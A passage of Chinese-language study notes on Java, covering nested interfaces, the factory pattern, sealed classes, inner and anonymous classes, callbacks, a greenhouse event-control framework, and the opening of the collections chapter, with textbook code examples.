id="10.9-%E5%B5%8C%E5%A5%97%E6%8E%A5%E5%8F%A3" tabindex="-1">10.9 嵌套接口</h3><ul><li>接口可以嵌套在类和其它接口中,嵌套在类中的接口自动是public和static的,嵌套在接口中的接口自动是public的</li></ul><pre><code class="language-java">class A &#123;  interface B &#123;    void f();  &#125;  public class BImp implements B &#123;    @Override public void f() &#123;&#125;  &#125;  public class BImp2 implements B &#123;    @Override public void f() &#123;&#125;  &#125;  public interface C &#123;    void f();  &#125;  class CImp implements C &#123;    @Override public void f() &#123;&#125;  &#125;  private class CImp2 implements C &#123;    @Override public void f() &#123;&#125;  &#125;  private interface D &#123;    void f();  &#125;  private class DImp implements D &#123;    @Override public void f() &#123;&#125;  &#125;  public class DImp2 implements D &#123;    @Override public void f() &#123;&#125;  &#125;  public D getD() &#123; return new DImp2(); &#125;  private D dRef;  public void receiveD(D d) &#123;    dRef = d;    dRef.f();  &#125;&#125;interface E &#123;  interface G &#123;    void f();  &#125;// 1. 多余的 &quot;public&quot;,接口中的都是 public 的  public interface H &#123;    void f();  &#125;  void g();// 2. 接口中不能使用private  //- private interface I &#123;&#125;&#125;public class NestingInterfaces &#123;  public class BImp implements A.B &#123;    @Override public void f() &#123;&#125;  &#125;  class CImp implements A.C &#123;    @Override public void f() &#123;&#125;  &#125;// 3. private 接口只能在定义的类中实现  //- class DImp implements A.D &#123;  //- public void f() &#123;&#125;  //- &#125;  class EImp implements E &#123;    @Override public void g() &#123;&#125;  &#125;  class EGImp implements E.G &#123;    @Override public void f() &#123;&#125;  &#125;  class EImp2 implements E &#123;    @Override public void g() &#123;&#125;    class EG implements E.G &#123;      @Override public void f() &#123;&#125;    &#125;  &#125;  public static void main(String[] args) &#123;    A a = new A();// 4. A.D 为A的私有接口,除了A之外,没有人能实现A.D接口:    //- A.D ad = a.getD();// 5. 只能返回A.D的引用,而且只能在A中使用:    //- A.DImp2 di2 = a.getD();// 6. 无法访问该接口的方法    //- a.getD().f();// 7. 只有另一个A才能接收处理A.D    A a2 = new A();    a2.receiveD(a.getD());  &#125;&#125;</code></pre><ul><li>这些特性初步看是为了语法一致性,但之后肯定是有新的用法</li></ul><h3 id="10.10-%E6%8E%A5%E5%8F%A3%E5%92%8C%E5%B7%A5%E5%8E%82" tabindex="-1">10.10 接口和工厂</h3><ul><li>工厂方法设计模式:在接口中提供一个创建对象的方法,让实现类决定实例化对象的类型<ul><li>这样代码和接口实现完全隔离,可以透明地将某个实现替换为另一个实现</li></ul></li><li>例子:</li></ul><pre><code class="language-java">interface Service &#123;  void method1();  void method2();&#125;interface ServiceFactory &#123;  Service getService();&#125;class Service1 implements Service &#123;  Service1() &#123;&#125; // Package access  @Override public void method1() &#123;    System.out.println(&quot;Service1 method1&quot;);  &#125;  @Override public void method2() &#123;    System.out.println(&quot;Service1 method2&quot;);  &#125;&#125;class Service1Factory implements ServiceFactory &#123;  @Override public Service getService() &#123;    return new Service1();  &#125;&#125;class Service2 implements Service &#123;  Service2() &#123;&#125; // Package access  @Override public void method1() &#123;    System.out.println(&quot;Service2 method1&quot;);  &#125;  @Override public void method2() &#123;    System.out.println(&quot;Service2 method2&quot;);  &#125;&#125;class Service2Factory implements ServiceFactory &#123;  @Override public Service getService() &#123;    return new Service2();  &#125;&#125;public class Factories &#123;  public static void  serviceConsumer(ServiceFactory fact) &#123;    Service s = fact.getService();    s.method1();    s.method2();  &#125;  public static void main(String[] args) &#123;    serviceConsumer(new Service1Factory());    // 服务完全可以互换    serviceConsumer(new Service2Factory());  &#125;&#125;/* Output:Service1 method1Service1 method2Service2 method1Service2 method2*/</code></pre><ul><li>代码中可以看出通过工厂这一中间接口,我们不必在代码中创建Service1和Service2的对象,而是通过工厂创建,这样就可以在不修改代码的情况下,将Service1替换为Service2</li><li>这种中间层相当于创建框架,当Service里代码很多时,我们可以很方便地进行复用</li></ul><h3 id="10.11-%E6%96%B0%E7%89%B9%E6%80%A7%3A%E6%8E%A5%E5%8F%A3%E7%9A%84private%E6%96%B9%E6%B3%95" tabindex="-1">10.11 新特性:接口的private方法</h3><ul><li>Java9之后,接口可以包含private方法,这样就可以在接口中提供方法的实现,而不是在实现类中提供方法的实现</li><li>此后,default方法和static方法都可以使用private方法,这样就可以避免代码重复<ul><li>default方法:接口中具有默认实现的方法.默认方法允许在接口中添加新的方法，而不会破坏已有的实现类。实现类可以选择保留默认方法的实现，也可以重写默认方法来提供自己的实现。</li><li>static方法:静态方法与接口相关联，而不是与实现类的实例相关联。它们可以通过接口名直接调用，无需实例化接口。</li><li>private方法:私有方法只能在接口内部被调用，用于封装和重用代码块。私有方法可以被默认方法或静态方法调用，以提供共享的实现逻辑。</li></ul></li></ul><h3 id="10.12-%E6%96%B0%E7%89%B9%E6%80%A7%3A%E5%AF%86%E5%B0%81%E7%B1%BB%E5%92%8C%E5%AF%86%E5%B0%81%E6%8E%A5%E5%8F%A3" tabindex="-1">10.12 新特性:密封类和密封接口</h3><ul><li>从JDK17开始引入密封(sealed)类和密封接口,可以限制类或接口的继承关系,只允许特定的类或接口继承或实现该类或接口</li></ul><pre><code class="language-java">sealed class Base permits D1, D2 &#123;&#125;final class D1 extends Base &#123;&#125;final class D2 extends Base &#123;&#125;// 非法：// final class D3 extends Base &#123;&#125;sealed interface Ifc permits Imp1, Imp2 &#123;&#125;final class Imp1 implements Ifc &#123;&#125;final class Imp2 implements Ifc &#123;&#125;sealed abstract class AC permits X &#123;&#125;final class X extends AC &#123;&#125;</code></pre><ul><li><strong>permits</strong>关键字允许我们在单独的文件夹中定义子类,如果所有子类在同一文件夹中可不带permits关键字</li><li>一个sealed类需要至少有一个子类</li><li><strong>sealed</strong>的子类只能通过以下修饰符定义<ul><li>final:不允许有进一步的子类</li><li>sealed:允许有一组密封子类</li><li>non-sealed:允许有任意子类</li></ul></li></ul><pre><code class="language-java">//sealed类的层次结构sealed class Bottom permits Level1 &#123;&#125;sealed class Level1 extends Bottom permits Level2 &#123;&#125;sealed class Level2 extends Level1 permits Level3 &#123;&#125;final class Level3 extends Level2 &#123;&#125;//sealed类的子类可以接触密封sealed class Super permits Sub1, Sub2 &#123;&#125;final class Sub1 extends Super &#123;&#125;non-sealed class Sub2 extends Super &#123;&#125;class Any1 extends Sub2 &#123;&#125;class Any2 extends Sub2 &#123;&#125;</code></pre><h2 id="11-%E5%86%85%E9%83%A8%E7%B1%BB" tabindex="-1">11 内部类</h2><h3 id="11.1-%E5%88%9B%E5%BB%BA%E5%86%85%E9%83%A8%E7%B1%BB" tabindex="-1">11.1 创建内部类</h3><ul><li>把类定义放在另一个类中,这就是内部类,内部类可以访问外部类的所有成员,而不需要任何特殊条件,内部类就像是一个独立的实体,与外部类有着密切的联系,但是又可以独立于外部类的实例存在</li><li>普遍的使用情况:外部类有一个方法返回指向内部类的引用,或者外部类的方法接受内部类的引用作为参数,这样就可以在外部类的方法中使用内部类的方法和字段</li></ul><pre><code class="language-java">public class Parcel2 &#123;  class Contents &#123;    private int i = 11;    public int value() &#123; return i; &#125;  &#125;  class Destination &#123;    private String label;    Destination(String whereTo) &#123;      label = whereTo;    &#125;    String readLabel() &#123; return label; &#125;  &#125;  public Destination to(String s) &#123;    return new Destination(s);  &#125;  public Contents contents() &#123;    return new Contents();  &#125;  public void ship(String dest) &#123;    Contents c = contents();    Destination d = to(dest);    System.out.println(d.readLabel());  &#125;  public static void main(String[] args) &#123;    Parcel2 p = new Parcel2();    p.ship(&quot;Tasmania&quot;);    Parcel2 q = new Parcel2();    // 返回内部类的引用    Parcel2.Contents c = q.contents();    Parcel2.Destination d = q.to(&quot;Borneo&quot;);  &#125;&#125;</code></pre><h3 id="11.2-%E5%88%B0%E5%A4%96%E9%83%A8%E7%B1%BB%E7%9A%84%E9%93%BE%E6%8E%A5" tabindex="-1">11.2 到外部类的链接</h3><ul><li>当创建一个内部类时,这个内部类的对象会隐含一个链接,指向用于创建该对象的外围对象.通过该链接,无需任何条件,内部类对象可以访问外围对象的成员.内部类用用对外围对象所有元素的访问权</li><li>当内部类非static时,内部类对象和外部类对象关联创建</li></ul><h3 id="11.3-%E4%BD%BF%E7%94%A8.this%E5%92%8C.new" tabindex="-1">11.3 使用.this和.new</h3><ul><li>当内部类字段和外部类同名时,可以使用this字段.例如，如果内部类为InnerClass，外部类为OuterClass，并且它们都有一个名为field的字段，可以使用OuterClass.this.field来引用外部类的字段。</li><li>创建内部类对象时,使用.new关键字;同时必须使用外部类的实例来创建内部类的实例,因为内部类对象会暗暗地连接到创建它的外部类对象上,但是如果创建的是静态内部类,则不需要外部类的实例</li></ul><pre><code class="language-java">public class OuterClass &#123;    private int field = 10;    public class InnerClass &#123;        private int field = 20;        public void printFields() &#123;            System.out.println(&quot;Inner field: &quot; + this.field); // 内部类的字段            System.out.println(&quot;Outer field: &quot; + OuterClass.this.field); // 外部类的字段        &#125;    &#125;    public static void main(String[] args) &#123;        OuterClass outer = new OuterClass();        OuterClass.InnerClass inner = outer.new InnerClass();        inner.printFields();    &#125;&#125;</code></pre><h3 id="11.4-%E5%86%85%E9%83%A8%E7%B1%BB%E5%92%8C%E5%90%91%E4%B8%8A%E8%BD%AC%E5%9E%8B" tabindex="-1">11.4 内部类和向上转型</h3><ul><li>用private内部类进行接口实现,可以完全隐藏实现的细节,并且完全不用关心接口的实现是否需要修改,因为内部类完全被封装在了外部类中,所以可以很方便地修改内部类的实现,而不会影响到外部类的使用</li><li>private内部类也不会被上下转型到,因为只有外部类才能够访问内部类</li></ul><h3 id="11.5-%E5%9C%A8%E6%96%B9%E6%B3%95%E5%92%8C%E4%BD%9C%E7%94%A8%E5%9F%9F%E4%B8%AD%E7%9A%84%E5%86%85%E9%83%A8%E7%B1%BB" tabindex="-1">11.5 在方法和作用域中的内部类</h3><ul><li><p>内部类可以在任意的作用域内定义类,理由如下</p><ul><li><ol><li>实现某种接口,以便返回或创建一个引用</li></ol></li><li><ol start="2"><li>作为辅助类,不想公开</li></ol></li></ul></li><li><p>内部类仅在作用域内有效,这种类叫做<strong>局部内部类</strong></p></li></ul><pre><code class="language-java">public class Parcel6 &#123;  private void internalTracking(boolean b) &#123;    if(b) &#123;      class TrackingSlip &#123;        private String id;        TrackingSlip(String s) &#123;          id = s;        &#125;        String getSlip() &#123; return id; &#125;      &#125;      TrackingSlip ts = new TrackingSlip(&quot;slip&quot;);      String s = ts.getSlip();    &#125;    // 超出作用域范围,不可使用TrackingSlipl类    //- TrackingSlip ts = new TrackingSlip(&quot;x&quot;);  &#125;  public void track() &#123; internalTracking(true); &#125;  public static void main(String[] args) &#123;    Parcel6 p = new Parcel6();    p.track();  &#125;&#125;</code></pre><h3 id="11.6-%E5%8C%BF%E5%90%8D%E5%86%85%E9%83%A8%E7%B1%BB" tabindex="-1">11.6 匿名内部类</h3><ul><li>匿名内部类:没有名字的内部类,可以在定义一个类的同时实例化该类,这样可以省去编写一个完整的类的步骤,但是匿名内部类不能有构造器,因为它连名字都没有,只能使用一次,用完就不能再用了</li></ul><pre><code class="language-java">public class Parcel7 &#123;  public Contents contents() &#123;    return new Contents() &#123; // 插入内部类定义      private int i = 11;      @Override public int value() &#123; return i; &#125;    &#125;; // 分号不能省略  &#125;  public static void main(String[] args) &#123;    Parcel7 p = new Parcel7();    Contents c = p.contents();  &#125;&#125;//如果不使用匿名内部类,就要创建一个完整的类,如下public class Parcel7b &#123;  class MyContents implements Contents &#123;    private int i = 11;    @Override public int value() &#123; return i; &#125;  &#125;  public Contents contents() &#123;    return new MyContents();  &#125;  public static void main(String[] args) &#123;    Parcel7b p = new Parcel7b();    Contents c = p.contents();  &#125;&#125;//有参构造时写法如下public class Parcel8 &#123;  public Wrapping wrapping(int x) &#123;    // Base constructor call:    return new Wrapping(x) &#123;          // [1]将适当的参数传给基类构造器。      @Override public int value() &#123;        return super.value() * 47;      &#125;    &#125;;                                // [2]标记表达式结束,语法完备性  &#125;  public static void main(String[] args) &#123;    Parcel8 p = new Parcel8();    Wrapping w = p.wrapping(10);  &#125;&#125;</code></pre><ul><li>匿名类使用匿名类之外定义的对象时,需保证对象引用是用final修饰的</li><li>匿名类没有构造器,可以借助<strong>实例初始化</strong>来达到类似构造器的作用,但只能初始化一次</li></ul><pre><code class="language-java">public class Parcel10 &#123;  public Destination  destination(final String dest, final float price) &#123;//匿名类中的外部引用必须是final的    return new Destination() &#123;      private int cost;      // 匿名类的实例初始化,达到构造器的小狗      &#123;        cost = Math.round(price);        if(cost &gt; 100)          System.out.println(&quot;Over budget!&quot;);      &#125;      private String label = dest;      @Override      public String readLabel() &#123; return label; &#125;    &#125;;  &#125;  public static void main(String[] args) &#123;    Parcel10 p = new Parcel10();    Destination d = p.destination(&quot;Tasmania&quot;, 101.395F);  &#125;&#125;</code></pre><ul><li>与普通类相比,匿名类有着局限性,要么是扩展一个类,要么实现一个接口,但是不能两者兼备</li><li>同时匿名类不能是抽象类,因为匿名类没有名字,所以无法提供给其他代码</li><li>实现接口时,也只能实现一个</li></ul><h3 id="11.7-%E5%B5%8C%E5%A5%97%E7%B1%BB" tabindex="-1">11.7 嵌套类</h3><ul><li><p>如果不需要内部类和外部类之间的链接,可以将内部类设置为static,此时称之为<strong>嵌套类</strong>,这意味着</p><ul><li><ol><li>不需要一个外部类的对象来创建嵌套类对象</li></ol></li><li><ol start="2"><li>无法从嵌套类的对象中访问非静态的外部类对象</li></ol></li><li><ol start="3"><li>二者之间更像是一种命名空间的关系,内部类在外部类这个命名空间下</li></ol></li></ul></li><li><p>普通内部类和嵌套类也有不同:普通内部类中不能有static字段和方法,嵌套类可以</p><ul><li>因为普通内部类是依附于外部类的实例的,但static应该依附于类,这与static定义矛盾,编译器会禁止这一行为</li><li>而嵌套类不依赖于外部类的实例,因此可以使用static</li></ul></li></ul><h4 id="11.7.1-%E6%8E%A5%E5%8F%A3%E4%B8%AD%E7%9A%84%E7%B1%BB" tabindex="-1">11.7.1 接口中的类</h4><ul><li>接口中的任何类都是public和static的,因此接口嵌套类自动是public和static的,可以在接口内部创建嵌套类</li><li>当要创建接口的所有实现都要公用的代码时,可以使用接口内部的嵌套类,这样就可以隐藏实现细节,并将代码置于接口的内部.<ul><li>例子:可以用一个嵌套类存放测试代码,这样就可以很方便地测试接口的各种实现</li></ul></li></ul><h4 id="11.7.2-%E4%BB%8E%E5%A4%9A%E5%B1%82%E5%B5%8C%E5%A5%97%E7%9A%84%E5%86%85%E9%83%A8%E7%B1%BB%E4%B8%AD%E8%AE%BF%E9%97%AE%E5%A4%96%E9%83%A8%E6%88%90%E5%91%98" tabindex="-1">11.7.2 从多层嵌套的内部类中访问外部成员</h4><ul><li>一个内部类可以被嵌套人亦曾,可以访问任意层次的外部类的所有成员,但是外部类不能访问内部类的成员</li></ul><pre><code class="language-java">class MNA &#123;  private void f() &#123;&#125;  class A &#123;    private void g() &#123;&#125;    public class B &#123;      void h() &#123;        g();        f();      &#125;    &#125;  &#125;&#125;public class MultiNestingAccess &#123;  public static void main(String[] args) &#123;    MNA mna = new MNA();    MNA.A mnaa = mna.new A();    MNA.A.B mnaab = mnaa.new B();    mnaab.h();  &#125;&#125;</code></pre><h3 id="11.8-%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81%E5%86%85%E9%83%A8%E7%B1%BB" tabindex="-1">11.8 为什么需要内部类</h3><ul><li><p>内部类最吸引人的原因:每个内部类都能独立地继承自一个(接口的)实现,所以无论外部类是否已经继承了某个(接口的)实现,对于内部类都没有影响</p><ul><li>内部类完善了多重继承问题的解决方法,每个内部类都能独立继承具体类或抽象类或接口</li></ul></li><li><p>考虑情况</p><ul><li><ol><li>在一个类需要实现两个接口,那么可以用两种方法,二者无太大区别,可以从问题本质进行选择</li></ol><ul><li><ol><li>创建一个类实现两个接口</li></ol></li><li><ol start="2"><li>创建一个类实现一个接口,同时创建一个内部类,让内部类实现另一个接口</li></ol></li></ul></li><li><ol start="2"><li>如果一个类要继承两个抽象类或具体类,那么只能使用内部类</li></ol></li></ul></li></ul><h4 id="11.8.1-%E9%97%AD%E5%8C%85%E5%92%8C%E5%9B%9E%E8%B0%83" tabindex="-1">11.8.1 闭包和回调</h4><ul><li><p>闭包(closure):一个可调用的对象,它记录了一些信息,这些信息来自于创建它的作用域,可以在任何时刻使用这些信息来调用该对象</p><ul><li>从该定义看出,内部类是面向外部类对象的闭包,因为它不仅包含外部类对象(创建内部类的作用域),还自动拥有一个指向此外部类对象的引用,并且可以访问其所有成员</li></ul></li><li><p>回调:回调是一种常见的程序设计模式,可以在不改变代码的情况下,让某个特定的方法在特定的时刻被调用</p><ul><li>例子:事件驱动的GUI程序设计,当用户单击按钮时,按钮对象就会调用程序员预先定义好的方法,这种方法就叫做回调方法</li><li>如果回调通过指针实现,只能寄希望于程序员操作正确,而Java更为谨慎,语言中没有指针,而内部类提供了同样的解决方案,但更加安全,因为内部类可以完全访问外部类的成员</li></ul></li></ul><pre><code class="language-java">interface Incrementable &#123;  void increment();&#125;// 接口的简单实现class Callee1 implements Incrementable &#123;  private int i = 0;  @Override public void increment() &#123;    i++;    System.out.println(i);  &#125;&#125;class MyIncrement &#123;  public void increment() &#123;    System.out.println(&quot;Other operation&quot;);  &#125;  static void f(MyIncrement mi) &#123; mi.increment(); &#125;&#125;// 当callee2继承MyIncrement时,increment()方法重载了父类的方法//此时如果实现Incrementable接口,则Incrementable接口的increment()方法调用与父类矛盾,,因此需要使用内部类class Callee2 extends MyIncrement &#123;  private int i = 0;  @Override public void increment() &#123;    super.increment();    i++;    System.out.println(i);  &#125;  //内部类Closure实现了Incrementable接口,并且调用了外部类的increment()方法,提供了一个指向Callee2的引用,但该引用只能访问increment方法,相当于回调,但是更加安全  private class Closure implements Incrementable &#123;    @Override public void increment() &#123;      Callee2.this.increment();    &#125;  &#125;  Incrementable getCallbackReference() &#123;    return new Closure();  &#125;&#125;class Caller &#123;//Caller的构造器接收一个Incrementable的引用,并且在以后的某个时刻,可以使用此引用回调Incrementable的increment()方法  private Incrementable callbackReference;  Caller(Incrementable cbh) &#123;    callbackReference = cbh;  &#125;  void go() &#123; callbackReference.increment(); &#125;&#125;public class Callbacks &#123;  public static void main(String[] args) &#123;    Callee1 c1 = new Callee1();    Callee2 c2 = new Callee2();    MyIncrement.f(c2);    Caller caller1 = new Caller(c1);    Caller caller2 =      new Caller(c2.getCallbackReference());    caller1.go();    caller1.go();    caller2.go();    caller2.go();  &#125;&#125;</code></pre><ul><li>回调的价值在于灵活性:可以在运行时动态地决定调用哪些方法<ul><li>简单来说就是把一个对象传递给另一个对象,以便后者在合适的时候调用前者的方法</li><li>回调主要是通过回调函数,回调函数是一个作为参数传递给其他函数的函数，它能够被异步调用以处理某些事件或完成某些任务。</li></ul></li></ul><h4 id="11.8.2-%E5%86%85%E9%83%A8%E7%B1%BB%E5%92%8C%E6%8E%A7%E5%88%B6%E6%A1%86%E6%9E%B6" tabindex="-1">11.8.2 内部类和控制框架</h4><ul><li><p><strong>应用框架</strong>:是一种被设计用来解决某一类特定问题的类和接口的集合,它们的功能被加以通用化,可以应用于多种不同的问题</p></li><li><p>应用框架提供了通用的解决方案,我们在重写方法代码后可以通过定制解决特定的问题,这就是<strong>模板方法</strong>设计模式</p></li><li><p>控制框架:是一种特殊类型的应用框架,主要是为了满足对事件做出响应的需求.</p><ul><li>主要对事件做出响应的系统也叫做<strong>事件驱动</strong>系统,事件驱动系统通常包含一个或多个事件监听器,用来监听某些特定的事件,并且定义了在事件发生时所采取的动作</li><li>内部类可以简化控制框架的创建和使用</li></ul></li><li><p>考虑一个控制框架,其工作是当事件就绪时执行相应事件,下面给出一个简单的控制框架</p><ul><li>事件类Event来记录事件的状态,action函数为事件发生时所采取的动作</li><li>Controller类是一个控制框架,addEvent()方法用来添加事件,run()方法用来运行准备好的事件</li></ul></li></ul><pre><code class="language-java">import java.time.*; // Java 8 time classespublic abstract class Event &#123;  private Instant eventTime;  protected final Duration delayTime;  public Event(long millisecondDelay) &#123;    delayTime = Duration.ofMillis(millisecondDelay);    start();  &#125;  public void start() &#123; // Allows restarting    eventTime = Instant.now().plus(delayTime);  &#125;  public boolean ready() &#123;    return Instant.now().isAfter(eventTime);  &#125;  public abstract void action();&#125;import java.util.*;public class Controller &#123;  private List&lt;Event&gt; eventList = new ArrayList&lt;&gt;();  public void addEvent(Event c) &#123; eventList.add(c); &#125;  public void run() &#123;    while(eventList.size() &gt; 0)      for(Event e : new ArrayList&lt;&gt;(eventList)/*这里创建了列表的副本,防止删除元素影响遍历*/)        if(e.ready()) &#123;          System.out.println(e);          e.action();          eventList.remove(e);        &#125;  &#125;&#125;</code></pre><ul><li>对于每一个Event,我们都需要创建一个新的子类,并且覆盖action()方法,这样就可以定制自己的Event,接下来我们就可以使用内部类<ul><li><ol><li>控制框架的整个实现是在一个单独的类中,通过内部类我们可以封装不同的事件,用内部类表达不同的action()</li></ol></li><li><ol start="2"><li>内部类可以访问外部类的成员,因此可以很方便地修改事件列表,避免代码实现复杂</li></ol></li></ul></li><li>下面给出一个具体的例子,例子中<ul><li>Bell和Restart比较特殊,用到了外部类的EventList,因此需要使用外部类的引用,这里使用了this关键字</li></ul></li></ul><pre><code class="language-java">public class GreenhouseControls extends Controller &#123;  private boolean light = false;  public class LightOn extends Event &#123;    public LightOn(long delayTime) &#123;      super(delayTime);    &#125;    @Override public void action() &#123;      light = true;    &#125;    @Override public String toString() &#123;      return &quot;Light is on&quot;;    &#125;  &#125;  public class LightOff extends Event &#123;    public LightOff(long delayTime) &#123;      super(delayTime);    &#125;    @Override public void action() &#123;      light = false;    &#125;    @Override public String toString() &#123;      return &quot;Light is off&quot;;    &#125;  &#125;  private boolean water = false;  public class WaterOn extends Event &#123;    public WaterOn(long delayTime) &#123;      super(delayTime);    &#125;    @Override public void action() &#123;      water = true;    &#125;    @Override public String toString() &#123;      return &quot;Greenhouse water is on&quot;;    &#125;  &#125;  public class WaterOff extends Event &#123;    public WaterOff(long delayTime) &#123;      super(delayTime);    &#125;    @Override public void action() &#123;      water = false;    &#125;    @Override public String toString() &#123;      return &quot;Greenhouse water is off&quot;;    &#125;  &#125;  private String thermostat = &quot;Day&quot;;  public class ThermostatNight extends Event &#123;    public ThermostatNight(long delayTime) &#123;      super(delayTime);    &#125;    @Override public void action() &#123;      thermostat = &quot;Night&quot;;    &#125;    @Override public String toString() &#123;      return &quot;Thermostat on night setting&quot;;    &#125;  &#125;  public class ThermostatDay extends Event &#123;    public ThermostatDay(long delayTime) &#123;      super(delayTime);    &#125;    @Override public void action() &#123;      thermostat = &quot;Day&quot;;    &#125;    @Override public String toString() &#123;      return &quot;Thermostat on day setting&quot;;    &#125;  &#125;  public class Bell extends Event &#123;    public Bell(long delayTime) &#123;      super(delayTime);    &#125;    @Override public void action() &#123;      addEvent(new Bell(delayTime.toMillis()));    &#125;    @Override public String toString() &#123;      return &quot;Bing!&quot;;    &#125;  &#125;  public class Restart extends Event &#123;    private Event[] eventList;    public    Restart(long delayTime, Event[] eventList) &#123;      super(delayTime);      this.eventList = eventList;      for(Event e : eventList)        addEvent(e);    &#125;    @Override public void action() &#123;      for(Event e : eventList) &#123;        e.start(); // Rerun each event        addEvent(e);      &#125;      start(); // Rerun this Event      addEvent(this);    &#125;    @Override public String toString() &#123;      return &quot;Restarting system&quot;;    &#125;  &#125;  public static class Terminate extends Event &#123;    public Terminate(long delayTime) &#123;      super(delayTime);    &#125;    @Override    public void action() &#123; System.exit(0); &#125;    @Override public String toString() &#123;      return &quot;Terminating&quot;;    &#125;  &#125;&#125;// 运行控制框架public class GreenhouseController &#123;  public static void main(String[] args) &#123;    GreenhouseControls gc = new GreenhouseControls();    // 加入控制框架中不同的Event对象,这是命令设计模式的一个例子--eventList中的每个对象都是封装为对象的请求    gc.addEvent(gc.new Bell(900));    Event[] eventList = &#123;      gc.new ThermostatNight(0),      gc.new LightOn(200),      gc.new LightOff(400),      gc.new WaterOn(600),      gc.new WaterOff(800),      gc.new ThermostatDay(1400)    &#125;;    gc.addEvent(gc.new Restart(2000, eventList));    gc.addEvent(      new GreenhouseControls.Terminate(5000));    gc.run();  &#125;&#125;</code></pre><h3 id="11.9-%E7%BB%A7%E6%89%BF%E5%86%85%E9%83%A8%E7%B1%BB" tabindex="-1">11.9 继承内部类</h3><ul><li>因为内部类的构造器必须附加一个指向其包围类对象的引用,所以在继承内部类时,事情会变得有点复杂,必须有特殊的语法指明这种关联<ul><li>下面代码中InheritInner继承了内部类,创建构造器时,不能使用默认构造器,需要传递一个指向外部类对象的引用,并且必须在构造器内使用语法<code>OuterClassName.super()</code>来调用基类构造器</li></ul></li></ul><pre><code class="language-java">class WithInner &#123;  class Inner &#123;&#125;&#125;public class InheritInner extends WithInner.Inner &#123;  //- InheritInner() &#123;&#125; // 默认构造器会编译失败  InheritInner(WithInner wi) &#123;    wi.super();  &#125;  public static void main(String[] args) &#123;    WithInner wi = new WithInner();    InheritInner ii = new InheritInner(wi);  &#125;&#125;</code></pre><h3 id="11.10-%E5%86%85%E9%83%A8%E7%B1%BB%E5%8F%AF%E4%BB%A5%E8%A2%AB%E9%87%8D%E5%86%99%E5%90%97" tabindex="-1">11.10 内部类可以被重写吗</h3><ul><li>当继承外部类时,内部类没有特殊之处,因为这两个内部类是两个独立的实体,分别在自己的命名空间中</li><li>然而,显式地继承某个内部类是可行的</li></ul><pre><code class="language-java">class Egg2 &#123;  protected class Yolk &#123;    public Yolk() &#123;      System.out.println(&quot;Egg2.Yolk()&quot;);    &#125;    public void f() &#123;      System.out.println(&quot;Egg2.Yolk.f()&quot;);    &#125;  &#125;  private Yolk y = new Yolk();  Egg2() &#123; System.out.println(&quot;New Egg2()&quot;); &#125;  public void insertYolk(Yolk yy) &#123; y = yy; &#125;  public void g() &#123; y.f(); &#125;&#125;public class BigEgg2 extends Egg2 &#123;  public class Yolk extends Egg2.Yolk &#123;    public Yolk() &#123;      System.out.println(&quot;BigEgg2.Yolk()&quot;);    &#125;    @Override public void f() &#123;      System.out.println(&quot;BigEgg2.Yolk.f()&quot;);    &#125;  &#125;  public BigEgg2() &#123; insertYolk(new Yolk()); &#125;  public static void main(String[] args) &#123;    Egg2 e2 = new BigEgg2();    e2.g();  &#125;&#125;/* Output:Egg2.Yolk()New Egg2()Egg2.Yolk()BigEgg2.Yolk()BigEgg2.Yolk.f()*/</code></pre><h3 id="11.11-%E5%B1%80%E9%83%A8%E5%86%85%E9%83%A8%E7%B1%BB" tabindex="-1">11.11　局部内部类</h3><ul><li>内部类也可以在代码块内创建,通常是在方法体中;</li><li>局部内部类不能使用访问权限修饰符,因为其不是外围类的组成部分,但是它可以访问当前代码块中的常量及外围类的所有成员</li><li>局部内部类可以和匿名内部类相互替代<ul><li>但局部内部类可以创建多个该类对象,匿名内部类只能返回一个实例</li><li>局部内部类允许我们i当以具名的构造器和重载半杯,匿名类只能实例初始化</li></ul></li></ul><h3 id="11.12-%E5%86%85%E9%83%A8%E7%B1%BB%E6%A0%87%E8%AF%86%E7%AC%A6" tabindex="-1">11.12 内部类标识符</h3><ul><li>内部类标识符:在生成的.class文件中,内部类会被编译器重命名,以外部类名$内部类名的形式命名</li><li>如果内部类是匿名的，编译器会以数字作为内部类标识符。</li><li>如果内部类嵌套在其他内部类之内，它们的名字会被附加到其外围类标识符和 $ 之后</li></ul><h2 id="12-%E9%9B%86%E5%90%88" tabindex="-1">12 集合</h2><ul><li>java.until库有一组完整的<strong>集合类</strong>,基本的类型是List,Set,Queue,Map.这些类型也叫容器类</li><li>集合类中不能使用基本类型,要包装类型,但有自动装箱机制,我们不用担心</li></ul><h3 id="12.1-%E6%B3%9B%E5%9E%8B%E5%92%8C%E7%B1%BB%E5%9E%8B%E5%AE%89%E5%85%A8%E7%9A%84%E9%9B%86%E5%90%88" tabindex="-1">12.1 泛型和类型安全的集合</h3><ul><li><p>Java5之前的集合类,编译器允许向集合中插入不正确元素,但会引来很多问题,因此Java5引入了泛型,泛型的基本思想是参数化类型,也就是说所操作的数据类型被指定为一个参数</p></li><li><p>泛型的好处</p><ul><li><ol><li>类型安全,编译器会检查类型,不会出现向集合中插入错误类型的元素</li></ol></li><li><ol start="2"><li>消除了强制类型转换,不需要强制类型转换</li></ol></li><li><ol start="3"><li>代码更加简洁</li></ol></li></ul></li><li><p>定义泛型类实例</p></li></ul><pre><code class="language-java">//Java7 前前后都需要&lt;Apple&gt;,Java7后可以省略后面的&lt;Apple&gt;ArrayList&lt;Apple&gt; apples = new ArrayList&lt;Apple&gt;();ArrayList&lt;Apple&gt; apples = new ArrayList&lt;&gt;();//在JDK10/11 加入了var关键字,可以自动推断类型,代码更加简洁,但后面&lt;&gt;内必须标明类型,否则默认Object类var apples = new ArrayList&lt;Apple&gt;();</code></pre><h3 id="12.2-%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5" tabindex="-1">12.2 基本概念</h3><ul><li><p>Java集合类库用来&quot;持有对象&quot;,从设计上有两个不同的概念,表现为库的两个基本接口</p><ul><li><ol><li>Collection:一个由单独元素组成的序列,这些元素都服从一条或多条规则.</li></ol><ul><li>List必须按照元素插入顺序保存他们;</li><li>Set中不能有重复元素;</li><li>Queue按照排队规则来确定对象产生的顺序</li></ul></li><li><ol start="2"><li>Map:一组键值对象,使用键来查找值</li></ol><ul><li>ArrayList:使用一个数值查找某个元素,广义Map</li><li>Map:使用另一个对象来查找某个对象,也称关联数组或字典</li></ul></li></ul></li><li><p>我们编写的代码总是在和这些接口打交道</p></li></ul><pre><code class="language-java">//List为接口,ArrayList为实现类,这里相当于向上转型List&lt;Apple&gt; apples = new ArrayList&lt;&gt;();//我们可以替换实现类List&lt;Apple&gt; apples = new 